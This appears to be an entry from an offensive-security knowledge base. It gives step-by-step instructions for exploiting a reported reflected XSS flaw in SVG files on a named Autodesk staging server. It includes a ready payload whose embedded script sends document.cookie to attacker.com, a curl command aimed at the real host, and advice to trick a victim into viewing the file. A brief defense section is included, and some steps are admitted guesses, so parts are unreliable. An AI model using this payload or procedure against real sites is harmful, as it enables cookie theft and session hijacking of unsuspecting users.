---
id: b2c3d4e5-f6g7-8901-bcde-f23456789012
tags:
  - xss
  - reflected-xss
  - svg-injection
  - javascript
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
commands:
  - '[[commands/create-svg-payload]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:55:20.986Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
---
# Inject-Malicious-JavaScript-into-SVG-File

## Summary

This procedure exploits a reflected XSS vulnerability in SVG files on the Autodesk AREA staging server by injecting malicious JavaScript payloads embedded within the SVG structure, leading to arbitrary code execution in the victim's browser when the file is viewed.

## Description

The vulnerability arises from improper handling or sanitization of SVG content on area-resources-stg.autodesk.com, allowing attackers to embed executable JavaScript (e.g., via <script> tags or onload attributes) in SVG files. When a user views the affected SVG, the browser parses and executes the injected code in the context of the Autodesk domain, potentially enabling session hijacking, data theft, or further attacks. This was reported via HackerOne and fixed by Autodesk after validation. The procedure assumes public access to the server and focuses on crafting and delivering the payload for testing or exploitation.

## Requirements

1. Access to a text editor or command-line tool to generate the SVG file
2. Network access to the target server (area-resources-stg.autodesk.com)
3. A web browser for testing payload execution
4. Victim interaction (e.g., social engineering to view the SVG)

## Defense

Defensive measures and detection strategies:

- Implement strict content sanitization for SVG uploads/views, stripping or escaping JavaScript elements
- Use Content Security Policy (CSP) headers to block inline scripts on the server
- Monitor for anomalous JavaScript execution in browser logs or server access patterns to SVG resources

## Objectives

1. Inject and reflect malicious JavaScript via SVG files to achieve code execution
2. Demonstrate potential for browser-based attacks like alert popping or data exfiltration
3. Validate the vulnerability for reporting or remediation

## Instructions

### Step 1: Craft the Malicious SVG Payload

**Context**: Create an SVG file with embedded JavaScript that will execute upon loading, exploiting the lack of sanitization.

**Command** ([[commands/create-svg-payload]]):
```bash
echo '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(\'XSS via SVG\')"><script>fetch(\'https://attacker.com/steal?cookie=\' + document.cookie);</script></svg>' > malicious.svg
```

> This command generates a basic SVG file with an onload alert and a script to exfiltrate cookies to an attacker-controlled server. Save it as malicious.svg for hosting or upload.

### Step 2: Deliver and Trigger the Payload

**Context**: Host or reference the SVG on the vulnerable server endpoint and induce a victim to view it, triggering the reflected XSS.

**Instructions**: Upload the SVG to area-resources-stg.autodesk.com if possible, or use a parameter that reflects SVG content (inferred from vulnerability). Access the URL with the SVG in a browser to test:

```bash
curl -X GET "https://area-resources-stg.autodesk.com/path/to/svg?payload=$(cat malicious.svg)" --output test.svg
```

Open test.svg in a browser; the JavaScript should execute immediately.

> Expected output includes an alert dialog and a network request to the exfiltration endpoint if successful.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/create-svg-payload]]

## Tools Used


## Tags

- [[xss]]
- [[reflected-xss]]
- [[svg]]
- [[web]]
